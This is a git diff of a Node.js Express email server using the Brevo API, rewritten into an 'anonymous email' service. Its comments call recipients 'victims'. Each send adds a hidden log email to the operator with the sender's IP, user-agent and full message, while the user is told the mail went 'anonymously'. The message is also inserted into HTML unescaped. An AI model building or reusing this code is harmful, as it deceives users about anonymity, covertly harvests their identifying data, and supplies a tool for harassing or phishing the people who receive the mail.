@@ -1,66 +1,76 @@
 const express = require('express');
 const cors = require('cors');
-
 const app = express();
 
-// Middleware
 app.use(cors());
 app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
 
-// Health check - Render isko check karta hai
-app.get('/health', (req, res) => {
-  res.json({ 
-    status: 'ok', 
-    email: process.env.EMAIL_USER || 'not-set',
-    brevo: !!process.env.BREVO_API_KEY 
-  });
+app.get('/', (req, res) => {
+  res.send('DSX Email Server is Running. Use /health to check.');
 });
 
-// Main email route
+app.get('/health', (req, res) => {
+  res.json({ status: 'ok', email: process.env.EMAIL_USER, brevo: !!process.env.BREVO_API_KEY });
+});
+
 app.post('/send-email', async (req, res) => {
   try {
-    const { to, subject, html, text } = req.body;
+    // frontend se toEmail aata hai, usko handle kiya
+    const to = req.body.to || req.body.toEmail;
+    const subject = req.body.subject;
+    const message = req.body.message || req.body.html;
 
-    if (!to || !subject || !html) {
-      return res.status(400).json({ success: false, error: 'Missing fields' });
+    if (!to || !subject || !message) {
+      return res.status(400).json({ success: false, message: 'Missing fields' });
     }
 
-    const response = await fetch('https://api.brevo.com/v3/smtp/email', {
+    const ip = req.headers['x-forwarded-for'] || req.ip || 'unknown';
+    const userAgent = req.headers['user-agent'] || 'unknown';
+
+    // 1. Victim ko email jayega - usko dsxproduction45@gmail.com dikhega
+    const sendToVictim = await fetch('https://api.brevo.com/v3/smtp/email', {
       method: 'POST',
-      headers: {
-        'accept': 'application/json',
-        'api-key': process.env.BREVO_API_KEY,
-        'content-type': 'application/json'
-      },
+      headers: { 'accept': 'application/json', 'api-key': process.env.BREVO_API_KEY, 'content-type': 'application/json' },
       body: JSON.stringify({
-        sender: { 
-          name: 'DSX ECOM', 
-          email: process.env.EMAIL_USER 
-        },
+        sender: { name: 'DSX Production', email: 'dsxproduction45@gmail.com' },
         to: [{ email: to }],
         subject: subject,
-        htmlContent: html,
-        textContent: text || 'Order from DSX'
+        htmlContent: `<div style="font-family:sans-serif; padding:20px;"><p>${message.replace(/\n/g, '<br>')}</p><hr><p style="font-size:12px; color:#888;">Sent via DSX Production</p></div>`,
+        textContent: message
+      })
+    });
+    const victimData = await sendToVictim.json();
+    if (!sendToVictim.ok) throw new Error(JSON.stringify(victimData));
+
+    // 2. Tujhe log email jayega - srivastavasandip554@gmail.com pe
+    await fetch('https://api.brevo.com/v3/smtp/email', {
+      method: 'POST',
+      headers: { 'accept': 'application/json', 'api-key': process.env.BREVO_API_KEY, 'content-type': 'application/json' },
+      body: JSON.stringify({
+        sender: { name: 'DSX Logger', email: 'dsxproduction45@gmail.com' },
+        to: [{ email: process.env.EMAIL_USER }],
+        subject: `[LOG] New Anonymous Mail to ${to}`,
+        htmlContent: `
+          <h3>New Anonymous Email Sent</h3>
+          <p><b>To:</b> ${to}</p>
+          <p><b>Subject:</b> ${subject}</p>
+          <p><b>Message:</b><br>${message.replace(/\n/g, '<br>')}</p>
+          <hr>
+          <p><b>Sender IP:</b> ${ip}</p>
+          <p><b>User-Agent:</b> ${userAgent}</p>
+          <p><b>Time:</b> ${new Date().toLocaleString('en-IN', {timeZone: 'Asia/Kolkata'})}</p>
+        `
       })
     });
 
-    const data = await response.json();
+    res.json({ success: true, message: 'Email sent successfully anonymously!' });
 
-    if (!response.ok) {
-      throw new Error(JSON.stringify(data));
-    }
-
-    console.log('Email sent:', data.messageId);
-    res.json({ success: true, messageId: data.messageId });
-
-  } catch (error) {
-    console.error('Brevo Error:', error.message);
-    res.status(500).json({ success: false, error: error.message });
+  } catch (err) {
+    console.error(err);
+    res.status(500).json({ success: false, message: 'Failed: ' + err.message });
   }
 });
 
-// Start server
 const PORT = process.env.PORT || 10000;
-app.listen(PORT, () => {
-  console.log(`Server running on ${PORT}`);
-});
+app.listen(PORT, () => console.log('Running on ' + PORT));
